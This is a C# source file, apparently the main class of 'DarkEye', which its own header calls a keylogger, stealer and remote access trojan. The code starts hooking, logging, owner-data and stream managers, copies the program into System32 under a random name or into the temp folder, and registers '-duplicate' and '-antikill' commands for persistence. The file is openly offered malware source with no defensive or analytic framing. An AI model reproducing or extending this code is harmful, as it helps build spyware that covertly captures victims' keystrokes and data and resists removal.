/******************************************************************************
 *                   DarkEye a KeyLogger/Stealer/RAT
 *                   Copyright (C) 2020 Gish_Reloaded
 ******************************************************************************/
using DarkEye.Classes.Managers;
using DarkEye.Classes.Objects;
using DarkEye.Classes.Utils;
using System;
using System.IO;

namespace DarkEye.Classes
{
    /*
    * Created by Gish_Reloaded on 27/03/2020.
    */
    class DarkEye
    {
        public readonly static string BUILD_NUMBER = "1";
        public readonly static string DARKEYE_TITLE = "#DarkEye v3b" + BUILD_NUMBER + "#";

        public static CommandManager commandManager;
        public static DuplicateManager duplicateManager;
        public static LineManager lineManager;
        public static OwnerManager ownerManager;
        public static HookManager hookManager;
        public static WindowManager windowManager;
        public static DataManager dataManager;

        public static Log globalLog;

        public static void Main(String[] args) { DarkEye.Initialize(args); }

        private static void Initialize(String[] args)
        {
            try
            {
                globalLog = new Log(null);
                globalLog.AddLog("Connected");

                Protection.Initialize();

                commandManager = new CommandManager();
                duplicateManager = new DuplicateManager(Utils.Utils.IsAdmin ?
                    Utils.Utils.GetRandomFileNameFromDirectory("C:\\Windows\\System32") :
                    (Path.GetTempPath() + Utils.Utils.GetRandomString(6) + ".exe"));
                ownerManager = new OwnerManager();
                dataManager = new DataManager();
                windowManager = new WindowManager();
                lineManager = new LineManager();
                hookManager = new HookManager();

                commandManager.registerCommand("-duplicate");
                commandManager.registerCommand("-antikill");
                commandManager.registerCommand("-debug");
                ownerManager.registerOwner(dataManager.ownerData);

                commandManager.Init(args);
                duplicateManager.Init();
                windowManager.Init();

                Streams.Initialize();

                globalLog.DispathContent();
                hookManager.Init();
            }
            catch (Exception ex) { WriteUtils.writeError(DARKEYE_TITLE + ": " + ex.Message); }
        }
    }
}
